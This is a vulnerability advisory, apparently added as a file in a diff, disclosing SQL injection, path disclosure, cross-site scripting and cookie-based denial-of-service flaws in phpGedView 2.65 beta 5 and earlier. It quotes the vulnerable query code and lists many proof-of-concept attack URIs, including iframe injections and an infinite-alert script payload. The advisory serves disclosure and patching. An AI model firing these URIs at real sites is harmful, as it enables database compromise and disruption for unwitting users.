@@ -1,0 +1,96 @@
+phpGedView Multiple Vulnerabilities
+
+Vendor: phpGedView
+Product: phpGedView
+Version: <= 2.65 beta 5
+Website: http://phpgedview.sourceforge.net
+
+
+Description:
+The phpGedView project parses GEDCOM 5.5 genealogy files and displays them on the Internet in a format similar to PAF. All it requires to run is a php enabled web server and a gedcom file. It is easily customizable for use on many different web sites. It is one of the top 10 most popular projects at SourceForge. 
+
+SQL Injection Vulnerability:
+phpGedView has a few files which are vulnerable to SQL injection. The vulnerable files are "timeline.php" and "placelist.php" The vulnerabilities are a result of input not being properly validated. The data given to these scripts are then executed by the "functions_mysql.php" file. As we can see below the $parent_id variable as well as the $level variable is passed directly into the query without being sanitized by the script at all in the "get_place_list()" function. 
+
+//-- find all of the places
+function get_place_list() {
+global $numfound, $j, $level, $parent, $found;
+global $GEDCOM, $TBLPREFIX, $placelist, $positions;
+
+// --- find all of the place in the file
+if ($level==0) $sql = "SELECT p_place FROM ".$TBLPREFIX."places WHERE p_level=0 
+AND p_file='$GEDCOM' ORDER BY p_place";
+else {
+	$psql = "SELECT p_id FROM ".$TBLPREFIX."places WHERE p_level=".($level-1)
+	." AND p_place LIKE '".$parent[$level-1]."' AND p_file='$GEDCOM' ORDER BY 
+	p_place";
+	$res = dbquery($psql);
+	$row = mysql_fetch_row($res);
+	$parent_id = $row[0];
+	$sql = "SELECT p_place FROM ".$TBLPREFIX."places WHERE p_level=$level AND 
+	p_parent_id=$parent_id AND p_file='$GEDCOM' ORDER BY p_place";
+}
+$res = dbquery($sql);
+while ($row = mysql_fetch_row($res)) {
+	$placelist[] = stripslashes($row[0]);
+	$numfound++;
+}
+}
+
+Below are some URI's which can be used to exploit the issue explained in the paragraph above. Also included is a URI that triggers a somewhat similar SQL vulnerability in the "timeline.php" script. 
+
+/placelist.php?level=1[Evil_Query]
+/placelist.php?level=1&parent[0]=[Evil_Query]
+/placelist.php?level=2&parent[0]=&parent[1]=[Evil_Query]
+/timeline.php?pids=[Evil_Query] 
+
+Path Disclosure Vulnerability:
+There are a decent number of ways an attacker could disclose the full path of the web server, thus aiding in the information gathering process preceding an attack. Below are a list of the vulnerable scripts and proof of concept URI's to reproduce the condition. 
+
+/indilist.php?alpha=\&surname_sublist=\
+/famlist.php?alpha=(&surname_sublist=yes&surname=\
+/placelist.php?level=1&parent[Blah]=
+/imageview.php?zoomval=blah
+/imageview.php?filename=/
+/timeline.php?pids[Blah]=
+/clippings.php?action=add&id=Blah
+/login.php?action=login
+/login.php?&changelanguage=yes&NEWLANGUAGE=Blah
+/gdbi.php?action=connect&username=Blah 
+
+Cross Site Scripting:
+I have found over a dozen instances of Cross Site Scripting in phpGedView, but there is probably more. The impact of these vulnerabilities are self explanatory; they allow code execution in the context of the browser of someone viewing the malicious URI. Below are examples of the numerous XSS vulns. 
+
+/descendancy.php?pid=<iframe>
+/index.php?rootid="><iframe>
+/individual.php?pid="><iframe>
+/login.php?url=/index.php?GEDCOM="><iframe>
+/relationship.php?path_to_find="><iframe>
+/relationship.php?path_to_find=0&pid1="><iframe>
+/relationship.php?path_to_find=0&pid1=&pid2="><iframe>
+/source.php?sid=<iframe>
+/imageview.php?filename=<iframe>
+/calendar.php?action=today&day=1&month=jan&year="><iframe>
+/calendar.php?action=today&day=1&month=<iframe>
+/calendar.php?action=today&day=<iframe>
+/gedrecord.php?pid=<iframe>
+/login.php?action=login&username="><iframe>
+/login.php?&changelanguage=yes&NEWLANGUAGE=<iframe>
+/gdbi_interface.php?action=delete&pid=<iframe> 
+
+Denial Of Service:
+It is also possible for an attacker to launch a DoS of sorts against a user who visits a certain URI. The vulnerability is in the language variable not being properly validated. If an attacker sends the following URI to a victim, they will not be able to access the phpGedView web site until they either clear their cookies, or manually reset the language settings by typing in a valid URI to reset the language back to something acceptable. The phpGedView website will not be able to be viewed by the victim until then. 
+
+/index.php?&changelanguage=yes&NEWLANGUAGE=[Junk_Here] 
+
+Or even one hundred million times more annoying is this :P 
+/index.php?&changelanguage=yes&NEWLANGUAGE=<script>var i=1; while(i){alert(i);};</script> 
+
+As I mentioned before though, it is possible to regain a normal session by manually typing in a value in the language variable that is acceptable to phpGedView. 
+
+Solution:
+These vulnerabilities have been addressed in the latest beta release. Users may obtain the latest beta version at 
+http://sourceforge.net/project/showfiles.php?group_id=55456 
+
+Credits:
+James Bercegay of the GulfTech Security Research Team.
